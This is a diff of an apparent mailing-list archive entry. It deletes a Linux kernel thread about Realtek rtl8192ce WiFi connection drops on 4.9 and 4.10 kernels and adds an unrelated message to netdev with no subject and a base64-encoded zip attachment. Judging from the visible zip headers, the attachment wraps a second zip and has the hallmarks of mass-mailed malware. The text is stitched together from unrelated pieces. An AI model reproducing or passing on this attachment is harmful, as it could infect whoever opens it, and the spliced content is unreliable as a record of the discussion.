@@ -1,139 +1,54 @@
-From: rupert THURNER <rupert.thurner@gmail.com>
-Subject: Re: 4.10.9 nok with realtek wlan, atom
-Date: Sun, 16 Apr 2017 20:09:13 +0200
-Message-ID: <CAJs9aZ_QRgqAjt+6FV=ZkPvYvkDedwtegMKC4Dk-uT8KtrE-mA@mail.gmail.com>
-References: <CAJs9aZ8HVPn_J9yPjvdBm-A_d3FiquPMGoy1xFsGopF8Xg_89Q@mail.gmail.com>
- <9e48930c-4822-5af4-2ebb-4d2dcd12d448@lwfinger.net> <CAJs9aZ9Hwnjb60mCycR3T2TWH75ZTdtEeWQ1iHRN+6NkkD+pZA@mail.gmail.com>
- <40bc6004-519c-7bf1-874b-3ae169140637@lwfinger.net>
+From: <cbordinaro@csudh.edu>
+Subject: (unknown)
+Date: Sun, 16 Apr 2017 18:50:44 -0000
+Message-ID: <149236864485.20711.4643356016786476236@bol-online.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Cc: Bjorn Helgaas <helgaas@kernel.org>, linux-pci@vger.kernel.org,
-        Chaoming Li <chaoming_li@realsil.com.cn>,
-        Kalle Valo <kvalo@codeaurora.org>,
-        linux-wireless@vger.kernel.org, netdev@vger.kernel.org,
-        linux-kernel@vger.kernel.org
-To: Larry Finger <Larry.Finger@lwfinger.net>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <40bc6004-519c-7bf1-874b-3ae169140637@lwfinger.net>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Content-Type: application/zip; name="EMAIL_165222_netdev.zip"
+Content-Transfer-Encoding: base64
+To: "netdev" <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from SITA-Sylhet-PC2.bol-online.com ([122.144.10.134]:51474 "HELO
+        bol-online.com" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1756557AbdDPSus (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Sun, 16 Apr 2017 14:50:48 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-On Sun, Apr 16, 2017 at 6:02 PM, Larry Finger <Larry.Finger@lwfinger.net> wrote:
-> On 04/16/2017 05:23 AM, rupert THURNER wrote:
->>
->> On Sat, Apr 15, 2017 at 10:40 PM, Larry Finger
->> <Larry.Finger@lwfinger.net> wrote:
->>>
->>> On 04/14/2017 03:26 PM, rupert THURNER wrote:
->>>>
->>>>
->>>> On Thu, Feb 9, 2017 at 9:09 PM, Larry Finger <Larry.Finger@lwfinger.net>
->>>> wrote:
->>>>>
->>>>>
->>>>> On 02/09/2017 01:43 PM, Bjorn Helgaas wrote:
->>>>>>
->>>>>>
->>>>>>
->>>>>> [+cc rtl8192ce folks in case they've seen this]
->>>>>>
->>>>>> On Thu, Feb 09, 2017 at 03:45:01PM +0100, rupert THURNER wrote:
->>>>>>>
->>>>>>>
->>>>>>>
->>>>>>> hi,
->>>>>>>
->>>>>>> not technical expert enough, i just wanted to give a short user
->>>>>>> feedback. for realtek wlan on atom, kernels up to 4.9.5 are ok, and
->>>>>>> kernel 4.10.0-rc7-g926af6273fc6 (arch linux-git version numbering) as
->>>>>>> well. kernels 4.9.6, 4.9.7, and 4.9.8 fail, i.e. connection to a WLAN
->>>>>>> hotspot is possible then drops, or connecting to wlan fails
->>>>>>> alltogether.
->>>>>>
->>>>>>
->>>>>>
->>>>>>
->>>>>> Thanks very much for your report, and sorry for the inconvenience.
->>>>>>
->>>>>> v4.10-rc7 works, so I guess we don't need to worry about fixing v4.10.
->>>>>>
->>>>>> But the stable kernels v4.9.6, v4.9.7, and v4.9.8 are broken, so we
->>>>>> need to figure out why and make sure we fix the v4.9 stable series.
->>>>>>
->>>>>> I can't tell yet whether this is PCI-related or not.  If it is,
->>>>>> 4922a6a5cfa7 ("PCI: Enumerate switches below PCI-to-PCIe bridges")
->>>>>> appeared in v4.9.6, and there is a known issue with that.  The issue
->>>>>> should be fixed by 610c2b7ff8f6 ("PCI/ASPM: Handle PCI-to-PCIe bridges
->>>>>> as roots of PCIe hierarchies"), which appeared in v4.9.9, so I guess
->>>>>> the first thing to do would be to test v4.9.9.
->>>>>>
->>>>>> If it's not fixed in v4.9.9, can you share the complete dmesg log
->>>>>> (output of "dmesg" command) and "lspci -vv" output for v4.9.5 (last
->>>>>> known working version) and v4.9.6 (first known broken version)?  On
->>>>>> v4.9.6, collect the dmesg output after the failure occurs.
->>>>>>
->>>>>>> 24: PCI 300.0: 0282 WLAN controller
->>>>>>>   [Created at pci.366]
->>>>>>>   Model: "Realtek RTL8188CE 802.11b/g/n WiFi Adapter"
->>>>>>>   Device: pci 0x8176 "RTL8188CE 802.11b/g/n WiFi Adapter"
->>>>>>>   Revision: 0x01
->>>>>>>   Driver: "rtl8192ce"
->>>>>>>   Driver Modules: "rtl8192ce"
->>>>>>>   Device File: wlp3s0
->>>>>>>   Features: WLAN
->>>>>
->>>>>
->>>>>
->>>>>
->>>>> It would be helpful if someone were to bisect this issue. The only
->>>>> issue
->>>>> that comes to mind was fixed in commit 52f5631a4c05 ("rtlwifi:
->>>>> rtl8192ce:
->>>>> Fix loading of incorrect firmware") which is in 4.10-rc7 and will be
->>>>> backported to 4.9.
->>>>>
->>>>> The above issue is one that could not be reproduced on my hardware,
->>>>> thus
->>>>> it
->>>>> took Jurij Smakov to find the fix. Without his bisection of the
->>>>> problem,
->>>>> who
->>>>> knows how long it would have taken to find my edit mistake.
->>>>
->>>>
->>>>
->>>> larry, using the newest kernel 4.10.8 the network connection dropps
->>>> again irregular.
->>>>
->>>> # dmesg
->>>> [    0.000000] Linux version 4.10.9-1-ARCH (builduser@tobias) (gcc
->>>> version 6.3.1 20170306 (GCC) ) #1 SMP PREEMPT Sat Apr 8 12:39:59 CEST
->>>> 2017
->>>> [   11.933373] rtl8192ce: rtl8192ce: Power Save off (module option)
->>>> [   11.933396] rtl8192ce: Using firmware rtlwifi/rtl8192cfw.bin
->>>> [   11.978307] ieee80211 phy0: Selected rate control algorithm 'rtl_rc'
->>>> [   11.978945] rtlwifi: rtlwifi: wireless switch is on
->>>>
->>>> # lspci -vv
->>>> Subsystem: Realtek Semiconductor Co., Ltd. RTL8188CE 802.11b/g/n WiFi
->>>> Adapter
->>>> Kernel driver in use: rtl8192ce
->>>
->>>
->>>
->>> Is firmware rtlwifi/rtl8192cfw.bin also used on kernels that work?
->>
->>
->> 4.10.x used to work. 4.10.6 or 4.10.7 it started failing? i am not too
->> sure about it.
->>
->> # ls -l /usr/lib/firmware/rtlwifi/rtl8192cfw.bin
->> -rw-r--r-- 1 root root 16192 Mar 10 12:15
->> /usr/lib/firmware/rtlwifi/rtl8192cfw.bin
->
->
-> That does not answer my question.
-4.10, 4.10.2, 4.10.3, 4.10.5 worked. as far as i can tell
-rtl8192cfw.bin did not change and was used. with kernels 4.9 there was
-a phase where rtl8192cfwU.bin was loaded which did not work. or i do
-not understand your question correctly?
+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
+AAAAAA==
